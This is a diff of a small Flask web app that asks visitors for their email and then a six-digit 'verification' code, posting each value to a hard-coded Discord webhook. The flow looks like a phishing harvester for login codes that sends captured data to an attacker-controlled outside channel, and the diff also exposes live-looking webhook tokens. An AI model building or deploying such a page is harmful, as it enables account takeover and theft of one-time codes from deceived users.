@@ -1,40 +1,42 @@
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, request, render_template, redirect, url_for
 import requests
 import os
 
 app = Flask(__name__)
 
-# PUT YOUR WEBHOOK IN RENDER ENV VARS
-# Key name: WEBHOOK_URL
-WEBHOOK_URL = os.getenv("https://discord.com/api/webhooks/1458997072442429460/PxrHKebDiDaNQvyF-8Gl3B-kyAp8xrvkqnv7cUw_PVdYydehwwFo2zuosM_cdhRvoWV3")
+WEBHOOK_URL = os.environ.get("https://discord.com/api/webhooks/1458185599688114309/X9TaZmu-EfBWAHNAv8DLennJgDm2QUYnCeIxxruMIdf9BLqj1CSxRsP09NxOBLr7Sm_u")
+
+@app.route("/", methods=["GET", "POST"])
+def email_step():
+    if request.method == "POST":
+        email = request.form.get("email", "").strip()
+        if not email:
+            return render_template("email.html", error="Email required")
+
+        requests.post(WEBHOOK_URL, json={
+            "content": f"📧 Email submitted:\n{email}"
+        })
+
+        return redirect(url_for("code_step"))
+
+    return render_template("email.html")
 
 
-@app.route("/")
-def index():
-    return render_template("index.html")
+@app.route("/code", methods=["GET", "POST"])
+def code_step():
+    if request.method == "POST":
+        code = request.form.get("code", "").strip()
 
+        if not code.isdigit() or len(code) != 6:
+            return render_template("code.html", error="Invalid code")
 
-@app.route("/submit", methods=["POST"])
-def submit():
-    data = request.json
+        requests.post(WEBHOOK_URL, json={
+            "content": f"🔢 Code submitted:\n{code}"
+        })
 
-    if not WEBHOOK_URL:
-        return jsonify({"error": "Webhook not set"}), 500
+        return render_template("done.html")
 
-    payload = {}
-
-    if "email" in data:
-        payload = {
-            "content": f"📧 **New Verification Email**\n{data['email']}"
-        }
-
-    if "code" in data:
-        payload = {
-            "content": f"🔢 **Verification Code Submitted**\n{data['code']}"
-        }
-
-    requests.post(WEBHOOK_URL, json=payload)
-    return "", 200
+    return render_template("code.html")
 
 
 if __name__ == "__main__":
